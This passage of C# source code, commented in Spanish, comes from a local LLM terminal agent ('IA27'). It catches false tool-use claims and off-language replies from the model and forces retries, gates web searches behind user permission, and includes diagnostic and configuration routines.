                Console.ForegroundColor = ConsoleColor.Cyan;
                content = await session.AskContinueAsync(bufferedToken, cancellationToken);
                continue;
            }

            // Marcador [[WRITE]] sin cierre [[END]]: el archivo NO se debe crear.
            if (WriteMarkerPresent.IsMatch(content))
            {
                if (claimRetries >= 2)
                {
                    DiscardBuffer();
                    session.ReplaceLastAssistant(StripToolMarkers(content));
                    return "El modelo intentó escribir el archivo pero emitió un marcador incompleto (falta el cierre [[END]]); el archivo NO se creó. Reintentá el pedido.";
                }

                claimRetries++;
                DiscardBuffer();
                session.ReplaceLastAssistant(string.Empty);
                session.AddContextMessage("[SISTEMA · marcador incompleto]\nEmitiste [[WRITE]] sin el cierre obligatorio [[END]]: el archivo NO se creó. Responde ahora con tu mensaje empezando EXACTAMENTE por [[WRITE]] <ruta> :: <contenido completo> y TERMINANDO con [[END]]. No afirmes nada: el sistema confirmará la creación.");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[INTERCEPCIÓN] Marcador [[WRITE]] incompleto (sin [[END]]). Reintentando con formato correcto...");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.Write("IA27> ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                content = await session.AskContinueAsync(bufferedToken, cancellationToken);
                continue;
            }

            // Anti-alucinación: afirmó crear un archivo o ejecutar un comando sin usar herramientas.
            var falseWriteClaim = !writeExecuted && WriteClaimPattern.IsMatch(content);
            var falseCmdClaim = !cmdExecuted && CmdClaimPattern.IsMatch(content);
            if (falseWriteClaim || falseCmdClaim)
            {
                if (claimRetries >= 2)
                {
                    await FlushBufferAsync();
                    return content;
                }

                claimRetries++;
                DiscardBuffer();
                session.ReplaceLastAssistant(string.Empty);
                var claimKind = falseWriteClaim
                    ? "afirmaste haber creado/guardado un archivo, pero NO emitiste el marcador [[WRITE]]: el archivo NO existe"
                    : "afirmaste haber ejecutado un comando, pero NO emitiste el marcador [[CMD]]: el comando NO se ejecutó";
                var claimMarker = falseWriteClaim
                    ? "Tu respuesta debe EMPEZAR EXACTAMENTE por [[WRITE]] <ruta> :: <contenido completo> y TERMINAR con [[END]]. Reutilizá el contenido que ya redactaste, que te lo devuelvo abajo."
                    : "Tu respuesta debe EMPEZAR EXACTAMENTE por [[CMD]] <comando>. El sistema pedirá permiso al usuario y luego lo ejecuta.";
                var claimDraft = falseWriteClaim ? ExtractDraftFromChat(content) : string.Empty;
                session.AddContextMessage($"[SISTEMA · afirmación falsa interceptada]\nEn tu respuesta anterior {claimKind}. {claimMarker} No vuelvas a afirmar la acción: el sistema la ejecutará y te confirmará con un mensaje." + (claimDraft.Length > 0 ? $"\n\n[BORRADOR A REUTILIZAR — copialo entre \":: \" y [[END]] EXACTAMENTE como está, sin las comillas triples (```) que lo delimitan:\n{claimDraft}]" : string.Empty));
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"[INTERCEPCIÓN] El modelo afirmó haber {(falseWriteClaim ? "creado un archivo" : "ejecutado un comando")} sin usar herramientas. Forzando reintento con marcador...");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.Write("IA27> ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                content = await session.AskContinueAsync(bufferedToken, cancellationToken);
                continue;
            }

            // El usuario pidió escribir un archivo y el modelo entregó el artefacto en el chat
            // (bloque de código + "abrí el archivo y reemplazá el contenido") en vez de emitir
            // [[WRITE]]. Es la segunda forma de no actuar, distinta de mentir: WriteClaimPattern no
            // matchea porque el modelo no afirma nada, así que antes la respuesta se imprimía tal
            // cual, el archivo no se escribía y el usuario tenía que pedirlo otra vez (y otra vez).
            // Acá no se imprime: se descarta y se fuerza el marcador reutilizando el borrador.
            if (!writeExecuted && LooksLikeArtifactInChat(content) && PromptRequestsWrite(originalPrompt))
            {
                if (claimRetries >= 2)
                {
                    await FlushBufferAsync();
                    return content + "\n\n[AVISO] Se agotaron los reintentos automáticos: el modelo no emitió el marcador [[WRITE]] y el archivo NO se modificó. Reintentá el pedido con /tokens 512.";
                }

                claimRetries++;
                DiscardBuffer();
                session.ReplaceLastAssistant(string.Empty);
                var draft = ExtractDraftFromChat(content);
                var targetPath = TryExtractExplicitTool(originalPrompt, out var pendingTool) && pendingTool.Kind == "WRITE"
                    ? pendingTool.Argument
                    : (lastToolPath ?? string.Empty);
                var target = targetPath.Length > 0 ? ResolveToolPath(targetPath) : string.Empty;
                var targetLine = target.Length > 0
                    ? $"Ruta a escribir: \"{target}\".\n"
                    : "Usá la ruta real del archivo que pidió el usuario (aparece en su mensaje).\n";
                var draftBlock = draft.Length > 0
                    ? $"\n\n[BORRADOR A REUTILIZAR — copialo entre \":: \" y [[END]] EXACTAMENTE como está, sin las comillas triples (```) que lo delimitan, sin agregar nada y sin comentarlo:]\n{draft}"
                    : "\n\nNo redactes una explicación ni le pidas permiso al usuario: emití el marcador.";
                session.AddContextMessage(
                    "[SISTEMA · artefacto entregado en el chat en vez de usar la herramienta]\n" +
                    $"En tu respuesta anterior MOSTRASTE el código en el chat y le indicaste al usuario que lo haga a mano, pero NO emitiste el marcador [[WRITE]]: el archivo NO se modificó.\n" +
                    targetLine +
                    "Tu respuesta debe EMPEZAR EXACTAMENTE por [[WRITE]] <ruta> :: <contenido completo> y TERMINAR con [[END]]. No expliques, no digas \"podés reemplazarlo\", no muestres el código aparte.\n" +
                    "No afirmes que creaste nada: el sistema pide permiso al usuario, escribe el archivo y te confirma con un mensaje." +
                    draftBlock);
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[INTERCEPCIÓN] El modelo te enseñó el código en el chat en vez de escribir el archivo. Forzando [[WRITE]] con su propio borrador...");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.Write("IA27> ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                content = await session.AskContinueAsync(bufferedToken, cancellationToken);
                continue;
            }

            var match = NetRequestPattern.Match(content);
            var isRefusal = !match.Success && config.NetEnabled && NetRefusalPattern.IsMatch(content);
            if (isRefusal)
            {
                match = NetRequestPattern.Match("[[NET]] " + originalPrompt);
            }

            // Degeneración a chino: el Qwen2.5 a veces cae en CJK pese al system prompt.
            // El "respondé SIEMPRE en español" alcanza como instrucción, pero no como trampa:
            // acá el host DETECTA el chino y fuerza reintento en vez de imprimir la respuesta rota.
            if (ContainsExcessiveCjk(content) && !ChineseRequestedPattern.IsMatch(originalPrompt))
            {
                if (claimRetries >= 2)
                {
                    await FlushBufferAsync();
                    return content;
                }

                claimRetries++;
                DiscardBuffer();
                session.ReplaceLastAssistant(string.Empty);
                session.AddContextMessage("[SISTEMA · idioma incorrecto]\nTu respuesta anterior se imprimió en CHINO y fue descartada. El usuario habla español. Reformulá la respuesta COMPLETA en español, sin ningún carácter chino, y sin mencionar esta corrección.");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[INTERCEPCIÓN] El modelo respondió en chino. Forzando respuesta en español...");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.Write("IA27> ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                content = await session.AskContinueAsync(bufferedToken, cancellationToken);
                continue;
            }

            if (!match.Success)
            {
                await FlushBufferAsync();
                return content;
            }

            if (!config.NetEnabled || netRounds >= 2)
            {
                var denied = NetRequestPattern.Replace(content, string.Empty).TrimEnd();
                if (denied.Length > 0)
                {
                    session.ReplaceLastAssistant(denied);
                    DiscardBuffer();
                    return denied;
                }

                DiscardBuffer();
                return config.NetEnabled
                    ? "No fue posible completar la búsqueda en internet. Reformula la pregunta o intenta más tarde."
                    : "Internet está desactivado en esta terminal; actívalo con /net on.";
            }

            netRounds++;
            DiscardBuffer();
            var query = match.Groups["query"].Value.Trim();
            if (query.Length == 0 || query.Length > 120)
            {
                query = Truncate(originalPrompt, 100);
            }

            if (isRefusal)
            {
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[INTERCEPCIÓN] El modelo negó tener acceso a internet. Activando búsqueda con tu permiso...");
                Console.ForegroundColor = ConsoleColor.Cyan;
                session.ReplaceLastAssistant("");
            }
            else
            {
                var cleaned = NetRequestPattern.Replace(content, string.Empty).TrimEnd();
                session.ReplaceLastAssistant(cleaned);
            }

            Console.WriteLine();
            var authorized = session.NetAutoAllowed;
            if (!authorized)
            {
                authorized = AuthorizeNet(session, query, cancellationToken);
                if (!authorized)
                {
                    searchContext = $"[SISTEMA · el usuario denegó el acceso a internet para \"{query}\"]\nResponde con tu propio conocimiento, sin inventar datos actuales y sin mencionar este sistema.";
                    session.AddContextMessage(searchContext);
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.DarkBlue;
                    Console.Write("IA27> ");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    content = await session.AskContinueAsync(bufferedToken, cancellationToken);
                    if (isRefusal && !string.IsNullOrWhiteSpace(content))
                    {
                        await FlushBufferAsync();
                        return content;
                    }
                    continue;
                }
            }

            Console.ForegroundColor = ConsoleColor.DarkBlue;
            Console.Write("[buscando en la web...] ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            var results = await SearchWebAsync(query, cancellationToken);
            searchContext = results is not null
                ? $"[SISTEMA · resultados de internet para \"{query}\"]\n{results}\nEl usuario preguntó: \"{originalPrompt}\". Usa estos datos reales para responder; cita la fuente cuando sea posible y no inventes nada."
                : $"[SISTEMA · búsqueda fallida para \"{query}\"]\nNo fue posible consultar internet ahora. Responde con tu propio conocimiento, sin inventar datos actuales y sin mencionar este sistema.";
            Console.WriteLine("listo.");

            session.AddContextMessage(searchContext);
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkBlue;
            Console.Write("IA27> ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            content = await session.AskContinueAsync(bufferedToken, cancellationToken);
            if (isRefusal && !string.IsNullOrWhiteSpace(content))
            {
                await FlushBufferAsync();
                return content;
            }
        }
    }

    // P15.37: comandos tipeados sin "/". Solo formas inequívocas:
    //   · una palabra suelta conocida (help, clear, exit, modelos...)
    //   · "net", "net on", "net off" (cualquier otro argumento arriesga
    //     apagar la red con texto que era chat: "net neutro" NO normaliza)
    //   · "<comando> <número>" para tokens/temp/rp/topp/use
    // Texto libre NUNCA normaliza: "help me escribir un mail" no matchea,
    // y system/harness con texto libre exigen el "/" (riesgo alto de falso
    // positivo: "system failure", "agente de seguros").
    private static readonly Regex BareCommandPattern = new(
        @"^(?<cmd>help|ayuda|clear|limpiar|history|historial|modelos|cambiar|exit|quit|salir|descargar|stats|estadisticas)\s*$"
        + @"|^(?<cmd>net|internet)(?:\s+(?<arg>on|off))?\s*$"
        + @"|^(?<cmd>tokens|max-tokens|temp|rp|topp)\s+(?<arg>[0-9]+(?:[.,][0-9]+)?)\s*$"
        + @"|^(?<cmd>use)\s*(?<arg>[0-9]*)?\s*$",
        RegexOptions.Compiled | RegexOptions.IgnoreCase);

    private static string? NormalizeBareCommand(string input)
    {
        var match = BareCommandPattern.Match(input);
        if (!match.Success)
        {
            return null;
        }

        var arg = match.Groups["arg"].Success ? match.Groups["arg"].Value.Trim() : string.Empty;
        return "/" + match.Groups["cmd"].Value.ToLowerInvariant() + (arg.Length > 0 ? " " + arg : string.Empty);
    }

    private bool AuthorizeNet(ECnetServerSession session, string query, CancellationToken cancellationToken)
    {
        if (session.NetAutoAllowed)
        {
            return true;
        }

        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.Write($"[SOLICITUD] El modelo quiere buscar en internet: \"{Truncate(query, 80)}\". Permitir? (s = sí / N = no): ");
        Console.ForegroundColor = ConsoleColor.White;
        var line = Console.ReadLine();
        Console.ForegroundColor = ConsoleColor.Cyan;
        cancellationToken.ThrowIfCancellationRequested();
        var answer = line?.Trim().ToLowerInvariant();
        var allowed = answer is "s" or "si" or "sí" or "y" or "yes";
        if (allowed)
        {
            session.NetAutoAllowed = true;
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("  Permiso recordado para esta sesión. El agente buscará automáticamente en adelante.");
            Console.ForegroundColor = ConsoleColor.Cyan;
        }
        return allowed;
    }

    private static readonly Regex LocationIntentPattern = new(@"\b(d[óo]nde|direcci[óo]n|ubicaci[óo]n|ubicad[oa]s?|queda|quedan|c[óo]mo\s+lleg[oa]r?|mapa\s+de)\b", RegexOptions.Compiled | RegexOptions.IgnoreCase);

    private static readonly Regex WeatherIntentPattern = new(@"\b(clima|temperatura|pron[óo]stico|lluvia|llover[aá]?|va\s+a\s+llover|el\s+tiempo\s+(?:en|de)|c[óo]mo\s+est[áa]\s+el\s+tiempo)\b", RegexOptions.Compiled | RegexOptions.IgnoreCase);

    private enum WebSearchIntent { General, Location, Weather }

    private static WebSearchIntent ClassifySearchIntent(string query)
    {
        if (WeatherIntentPattern.IsMatch(query))
        {
            return WebSearchIntent.Weather;
        }

        return LocationIntentPattern.IsMatch(query) ? WebSearchIntent.Location : WebSearchIntent.General;
    }

    // [[NET]] por intención: dónde → Nominatim/OpenStreetMap; clima → Open-Meteo;
    // general → Wikipedia (extracto) + DuckDuckGo con el texto de la página ganadora.
    private static async Task<string?> SearchWebAsync(string query, CancellationToken cancellationToken)
    {
        var intent = ClassifySearchIntent(query);

        if (intent == WebSearchIntent.Weather)
        {
            var weather = await TryOpenMeteoAsync(query, cancellationToken);
            if (!string.IsNullOrWhiteSpace(weather))
            {
                return weather;
            }
        }

        if (intent == WebSearchIntent.Location)
        {
            var place = await TryNominatimAsync(query, cancellationToken);
            if (!string.IsNullOrWhiteSpace(place))
            {
                return place;
            }
        }

        var wiki = await TryWikipediaAsync(query, cancellationToken);
        var ddg = await TryDuckDuckGoAsync(query, cancellationToken);
        if (!string.IsNullOrWhiteSpace(wiki) && !string.IsNullOrWhiteSpace(ddg))
        {
            return wiki + "\n\n" + ddg;
        }

        return !string.IsNullOrWhiteSpace(ddg) ? ddg : wiki;
    }

    private static async Task<string?> TryDuckDuckGoAsync(string query, CancellationToken cancellationToken)
    {
        try
        {
            var url = "https://html.duckduckgo.com/html/?q=" + Uri.EscapeDataString(query);
            var html = await WebClient.GetStringAsync(url, cancellationToken);
            var linkMatches = Regex.Matches(html, "<a[^>]*class=\"result__a\"[^>]*href=\"([^\"]+)\"[^>]*>(.*?)</a>", RegexOptions.Singleline);
            if (linkMatches.Count == 0)
            {
                linkMatches = Regex.Matches(html, "<a[^>]*href=\"([^\"]+)\"[^>]*class=\"result__a\"[^>]*>(.*?)</a>", RegexOptions.Singleline);
            }

            if (linkMatches.Count == 0)
            {
                return null;
            }

            var snippetMatches = Regex.Matches(html, "<a[^>]*class=\"result__snippet\"[^>]*>(.*?)</a>", RegexOptions.Singleline);
            var builder = new StringBuilder();
            var count = 0;
            string? firstTitle = null;
            string? firstUrl = null;
            for (var index = 0; index < linkMatches.Count && count < 3; index++)
            {
                var title = StripHtml(linkMatches[index].Groups[2].Value);
                if (title.Length == 0)
                {
                    continue;
                }

                count++;
                firstTitle ??= title;
                firstUrl ??= ResolveDuckDuckGoUrl(linkMatches[index].Groups[1].Value);
                builder.AppendLine($"{count}. {title}");
                if (index < snippetMatches.Count)
                {
                    var snippet = StripHtml(snippetMatches[index].Groups[1].Value);
                    if (snippet.Length > 0)
                    {
                        builder.AppendLine($"   {snippet}");
                    }
                }
            }

            if (count == 0)
            {
                return null;
            }

            // Fase 2: descargar el primer resultado y pasarle al modelo texto plano,
            // no solo el título. Es lo que convierte una lista de links en contenido.
            if (firstUrl is not null)
            {
                var pageText = await TryFetchPageTextAsync(firstUrl, cancellationToken);
                if (!string.IsNullOrWhiteSpace(pageText) && pageText.Length > 120)
                {
                    builder.AppendLine();
                    builder.AppendLine($"Contenido de la página principal ({firstTitle}):");
                    builder.AppendLine(pageText);
                }
            }

            return builder.ToString().TrimEnd();
        }
        catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
        {
            throw;
        }
        catch (Exception error) when (error is HttpRequestException or TaskCanceledException or IOException or InvalidOperationException or NotSupportedException)
        {
            return null;
        }
    }

    private static async Task<string?> TryWikipediaAsync(string query, CancellationToken cancellationToken)
    {
        try
        {
            var url = "https://es.wikipedia.org/w/api.php?action=query&list=search&srsearch=" + Uri.EscapeDataString(query) + "&format=json&utf8=1&srlimit=3";
            var json = await WebClient.GetStringAsync(url, cancellationToken);
            using var document = JsonDocument.Parse(json);
            var items = document.RootElement.GetProperty("query").GetProperty("search");
            var builder = new StringBuilder();
            var count = 0;
            string? firstTitle = null;
            foreach (var item in items.EnumerateArray())
            {
                count++;
                var title = item.GetProperty("title").GetString() ?? string.Empty;
                var snippet = StripHtml(item.GetProperty("snippet").GetString() ?? string.Empty);
                if (count == 1 && title.Length > 0)
                {
                    firstTitle = title;
                }

                builder.AppendLine($"{count}. Wikipedia: {title}");
                if (snippet.Length > 0)
                {
                    builder.AppendLine($"   {snippet}");
                }
            }

            if (count == 0)
            {
                return null;
            }

            // Extracto en texto plano del primer artículo: contenido real, no solo snippet.
            if (firstTitle is not null)
            {
                var extract = await TryWikipediaExtractAsync(firstTitle, cancellationToken);
                if (!string.IsNullOrWhiteSpace(extract))
                {
                    builder.AppendLine();
                    builder.AppendLine($"Extracto del artículo \"{firstTitle}\":");
                    builder.AppendLine(extract);
                }
            }

            return builder.ToString().TrimEnd();
        }
        catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
        {
            throw;
        }
        catch (Exception error) when (error is HttpRequestException or TaskCanceledException or IOException or InvalidOperationException or NotSupportedException or JsonException or KeyNotFoundException or ArgumentException)
        {
            return null;
        }
    }

    private static string CleanPlaceQuery(string query)
    {
        var value = Regex.Replace(query, @"^\s*(?:d[óo]nde\s+(?:queda|quedan|est[áa]|se\s+encuentran?|hay)|direcci[óo]n\s+(?:del?\s+|de\s+)?|ubicaci[óo]n\s+(?:del?\s+|de\s+)?|c[óo]mo\s+lleg[oa]r?\s+(?:al\s+|a\s+|hasta\s+)?|buscar?\s+informaci[óo]n\s+sobre\s+)", string.Empty, RegexOptions.IgnoreCase);
        value = Regex.Replace(value, @"[?\s]+$", string.Empty).Trim();
        return value.Length >= 3 ? value : query.Trim();
    }

    private static string? ResolveDuckDuckGoUrl(string href)
    {
        var decoded = WebUtility.HtmlDecode(href).Trim('"', '\'');
        if (decoded.StartsWith("//", StringComparison.Ordinal))
        {
            decoded = "https:" + decoded;
        }

        var uddg = Regex.Match(decoded, @"[?&]uddg=([^&]+)");
        if (uddg.Success)
        {
            decoded = Uri.UnescapeDataString(uddg.Groups[1].Value);
        }

        return decoded.StartsWith("http://", StringComparison.OrdinalIgnoreCase) || decoded.StartsWith("https://", StringComparison.OrdinalIgnoreCase)
            ? decoded
            : null;
    }

    private static async Task<string?> TryFetchPageTextAsync(string url, CancellationToken cancellationToken)
    {
        try
        {
            var html = await WebClient.GetStringAsync(url, cancellationToken);
            html = Regex.Replace(html, @"(?is)<(script|style|noscript|svg|header|footer|nav)\b[^>]*>.*?</\1>", " ");
            var text = StripHtml(html);
            const int max = 1600;
            return text.Length > max ? text.Substring(0, max) + "…" : text;
        }
        catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
        {
            throw;
        }
        catch (Exception error) when (error is HttpRequestException or TaskCanceledException or IOException or InvalidOperationException or NotSupportedException or ArgumentException)
        {
            return null;
        }
    }

    private static async Task<string?> TryWikipediaExtractAsync(string title, CancellationToken cancellationToken)
    {
        try
        {
            var url = "https://es.wikipedia.org/w/api.php?action=query&prop=extracts&explaintext=1&redirects=1&format=json&exchars=1200&titles=" + Uri.EscapeDataString(title);
            var json = await WebClient.GetStringAsync(url, cancellationToken);
            using var document = JsonDocument.Parse(json);
            var pages = document.RootElement.GetProperty("query").GetProperty("pages");
            foreach (var page in pages.EnumerateObject())
            {
                if (page.Value.TryGetProperty("extract", out var extract))
                {
                    var text = extract.GetString();
                    if (!string.IsNullOrWhiteSpace(text))
                    {
                        return text.Trim();
                    }
                }
            }

            return null;
        }
        catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
        {
            throw;
        }
        catch (Exception error) when (error is HttpRequestException or TaskCanceledException or IOException or InvalidOperationException or NotSupportedException or JsonException or KeyNotFoundException or ArgumentException)
        {
            return null;
        }
    }

    private static async Task<string?> TryNominatimAsync(string query, CancellationToken cancellationToken)
    {
        try
        {
            var place = CleanPlaceQuery(query);
            var url = "https://nominatim.openstreetmap.org/search?format=jsonv2&limit=3&accept-language=es&addressdetails=1&q=" + Uri.EscapeDataString(place);
            var json = await WebClient.GetStringAsync(url, cancellationToken);
            using var document = JsonDocument.Parse(json);
            if (document.RootElement.ValueKind != JsonValueKind.Array || document.RootElement.GetArrayLength() == 0)
            {
                return null;
            }

            var builder = new StringBuilder();
            builder.AppendLine($"Datos de ubicación reales (OpenStreetMap/Nominatim) para \"{place}\":");
            var count = 0;
            foreach (var item in document.RootElement.EnumerateArray())
            {
                count++;
                var name = item.GetProperty("display_name").GetString() ?? string.Empty;
                var lat = item.GetProperty("lat").GetString() ?? string.Empty;
                var lon = item.GetProperty("lon").GetString() ?? string.Empty;
                builder.AppendLine($"{count}. {name}");
                builder.AppendLine($"   Coordenadas: {lat}, {lon}");
                if (item.TryGetProperty("category", out var cat) && item.TryGetProperty("type", out var typ))
                {
                    builder.AppendLine($"   Tipo de lugar: {cat.GetString()}/{typ.GetString()}");
                }
            }

            return builder.ToString().TrimEnd();
        }
        catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
        {
            throw;
        }
        catch (Exception error) when (error is HttpRequestException or TaskCanceledException or IOException or InvalidOperationException or NotSupportedException or JsonException or KeyNotFoundException or ArgumentException)
        {
            return null;
        }
    }

    private static async Task<string?> TryOpenMeteoAsync(string query, CancellationToken cancellationToken)
    {
        try
        {
            var place = Regex.Replace(query, @"\b(climas?|temperaturas?|pron[óo]sticos?|lluvias?|llover[aá]?|va\s+a\s+llover|el\s+tiempo|c[óo]mo\s+est[áa]|consulta\b|actual)\b", " ", RegexOptions.IgnoreCase);
            place = Regex.Replace(place, @"^\s*(?:el\s+|la\s+|de\s+|del\s+|en\s+|por\s+)+", string.Empty, RegexOptions.IgnoreCase);
            place = Regex.Replace(place, @"[?\s]+$", string.Empty).Trim();
            if (place.Length < 3)
            {
                return null;
            }

            // countrycodes=ar: sin país explícito en la consulta, el agente opera
            // desde Salta, Argentina; sin el sesgo, "salta" matchea Salta Carnero (España).
            var geoUrl = "https://nominatim.openstreetmap.org/search?format=jsonv2&limit=1&accept-language=es&countrycodes=ar&q=" + Uri.EscapeDataString(place);
            var geoJson = await WebClient.GetStringAsync(geoUrl, cancellationToken);
            using var geoDoc = JsonDocument.Parse(geoJson);
            if (geoDoc.RootElement.ValueKind != JsonValueKind.Array || geoDoc.RootElement.GetArrayLength() == 0)
            {
                return null;
            }

            var geoFirst = geoDoc.RootElement[0];
            var lat = geoFirst.GetProperty("lat").GetString() ?? string.Empty;
            var lon = geoFirst.GetProperty("lon").GetString() ?? string.Empty;
            var placeName = geoFirst.GetProperty("display_name").GetString() ?? place;

            var wxUrl = "https://api.open-meteo.com/v1/forecast?latitude=" + lat
                      + "&longitude=" + lon
                      + "&current=temperature_2m,relative_humidity_2m,apparent_temperature,wind_speed_10m"
                      + "&daily=temperature_2m_max,temperature_2m_min,precipitation_probability_max&timezone=auto&forecast_days=3";
            var wxJson = await WebClient.GetStringAsync(wxUrl, cancellationToken);
            using var wxDoc = JsonDocument.Parse(wxJson);
            var current = wxDoc.RootElement.GetProperty("current");
            var builder = new StringBuilder();
            builder.AppendLine($"Clima REAL medido ahora en {placeName} (fuente: Open-Meteo):");
            builder.AppendLine($"Ahora: {current.GetProperty("temperature_2m").GetDouble()} °C, sensación térmica {current.GetProperty("apparent_temperature").GetDouble()} °C, humedad {current.GetProperty("relative_humidity_2m").GetInt32()} %, viento {current.GetProperty("wind_speed_10m").GetDouble()} km/h.");

            if (wxDoc.RootElement.TryGetProperty("daily", out var daily))
            {
                var dates = daily.GetProperty("time");
                var maxs = daily.GetProperty("temperature_2m_max");
                var mins = daily.GetProperty("temperature_2m_min");
                var rains = daily.GetProperty("precipitation_probability_max");
                for (var dayIndex = 0; dayIndex < dates.GetArrayLength(); dayIndex++)
                {
                    var label = dayIndex == 0 ? "Hoy" : dayIndex == 1 ? "Mañana" : "Pasado mañana";
                    var rain = rains.GetArrayLength() > dayIndex && rains[dayIndex].ValueKind == JsonValueKind.Number
                        ? $", prob. de lluvia {rains[dayIndex].GetInt32()} %"
                        : string.Empty;
                    builder.AppendLine($"{label}: máxima {maxs[dayIndex].GetDouble()} °C, mínima {mins[dayIndex].GetDouble()} °C{rain}.");
                }
            }

            return builder.ToString().TrimEnd();
        }
        catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
        {
            throw;
        }
        catch (Exception error) when (error is HttpRequestException or TaskCanceledException or IOException or InvalidOperationException or NotSupportedException or JsonException or KeyNotFoundException or ArgumentException or IndexOutOfRangeException)
        {
            return null;
        }
    }

    private static string StripHtml(string value)
    {
        var text = Regex.Replace(value, "<[^>]+>", " ", RegexOptions.Singleline);
        text = WebUtility.HtmlDecode(text);
        return Regex.Replace(text, @"\s+", " ").Trim();
    }

    private async Task<int> RunDoctorAsync()
    {
        var ok = true;
        Console.WriteLine("IA27 Terminal · diagnóstico");
        Console.WriteLine($"Configuración: {config.ConfigPath}");
        Console.WriteLine($"Python requerido: no");
        Console.WriteLine();
        Console.WriteLine(Check(config.ModelDirectory, Directory.Exists(config.ModelDirectory), "carpeta de modelos"));
        var models = catalog.List();
        if (models.Count == 0)
        {
            ok = false;
            Console.WriteLine("[X] no hay modelos GGUF en la carpeta");
        }
        else
        {
            Console.WriteLine($"[OK] modelos GGUF encontrados: {models.Count}");
            foreach (var model in models)
            {
                Console.WriteLine($"    {model.Name} ({FormatBytes(model.SizeBytes)})");
            }
        }

        ModelDescriptor? firstModel = null;
        if (models.Count > 0 && catalog.TryResolve(config.SelectedModel, out var selected) && selected is not null)
        {
            firstModel = selected;
        }
        else if (models.Count > 0)
        {
            firstModel = models[0];
        }

        if (firstModel is not null)
        {
            try
            {
                using var stream = File.OpenRead(firstModel.Path);
                Console.WriteLine($"[OK] modelo legible: {firstModel.Name} ({stream.Length:N0} bytes)");
            }
            catch (Exception error) when (error is IOException or UnauthorizedAccessException)
            {
                ok = false;
                Console.WriteLine($"[X] no se puede leer el modelo: {error.Message}");
            }
        }

        var runtime = RuntimeLocator.Find(config.RuntimeDirectory, config.ModelDirectory);
        if (runtime is null)
        {
            ok = false;
            Console.WriteLine("[X] no se encontró llama-server.exe");
            Console.WriteLine("    Configura: config set runtime-dir \"C:\\ruta\\ecnet_bin\"");
        }
        else
        {
            Console.WriteLine($"[OK] runtime: {runtime}");
            try
            {
                using var timeout = new CancellationTokenSource(TimeSpan.FromSeconds(10));
                var version = await RuntimeLocator.ReadVersionAsync(runtime, timeout.Token);
                if (!string.IsNullOrWhiteSpace(version))
                {
                    Console.WriteLine($"[OK] versión: {version.Replace('\r', ' ').Replace('\n', ' ')}");
                }
            }
            catch (Exception error) when (error is IOException or InvalidOperationException or SystemException)
            {
                Console.WriteLine($"[!] no se pudo leer la versión del runtime: {error.Message}");
            }
        }

        Console.WriteLine($"[INFO] contexto: {config.ContextSize}; tokens: {config.MaxTokens}; hilos: {config.Threads}; GPU layers: {config.GpuLayers}; net: {(config.NetEnabled ? "on" : "off")}");
        Console.WriteLine(ok ? "Resultado: OK" : "Resultado: revisar los puntos anteriores");
        return ok ? 0 : 1;
    }

    private int RunConfig(IReadOnlyList<string> rest)
    {
        var action = rest.Count == 0 ? "show" : rest[0].ToLowerInvariant();
        if (action is "show" or "mostrar")
        {
            Console.WriteLine($"Archivo:       {config.ConfigPath}");
            Console.WriteLine($"Modelos:       {config.ModelDirectory}");
            Console.WriteLine($"Runtime:       {config.RuntimeDirectory ?? "automático"}");
            Console.WriteLine($"Modelo:        {config.SelectedModel ?? "automático"}");
            Console.WriteLine($"Contexto:      {config.ContextSize}");
            Console.WriteLine($"Max tokens:    {config.MaxTokens}");
            Console.WriteLine($"Hilos CPU:     {config.Threads}");
            Console.WriteLine($"GPU layers:    {config.GpuLayers}");
            Console.WriteLine($"Temperatura:   {config.Temperature:0.00}");
            Console.WriteLine($"Repetic. pen.: {config.RepeatPenalty:0.00}");
            Console.WriteLine($"Top-P:         {config.TopP:0.00}");
            Console.WriteLine($"Chat template: {config.ChatTemplate}");
            Console.WriteLine($"Cache KV:      {config.CacheTypeK}/{config.CacheTypeV}");
            Console.WriteLine($"Internet:      {(config.NetEnabled ? "on (bajo autorización)" : "off")}");
            Console.WriteLine($"Seguridad red: {(config.SecurityToolsEnabled ? "ACTIVADA (SCAN/SPOOF habilitados)" : "desactivada (SCAN/SPOOF bloqueados)")}");
            Console.WriteLine($"Modo CMD:      {(config.CmdMode == "allowlist" ? "allowlist (solo lectura local)" : "full (PowerShell completo)")}");
            Console.WriteLine($"Espera carga:  {config.StartupTimeoutSeconds} s");
            Console.WriteLine($"System prompt: {Truncate(config.SystemPrompt, 100)}");
            return 0;
        }

        if (action == "path")
        {
            Console.WriteLine(config.ConfigPath);
            return 0;
        }

        if (action == "reset")
        {
            config.Reset();
            config.Save();
            Console.WriteLine("Configuración restablecida.");
            return 0;
        }

        if (action != "set" || rest.Count < 3)
        {
            throw new TerminalException("Uso: config set <clave> <valor> | config show | config reset | config path");
        }

        var key = rest[1].ToLowerInvariant().Replace('_', '-');
        var value = string.Join(" ", rest.Skip(2));
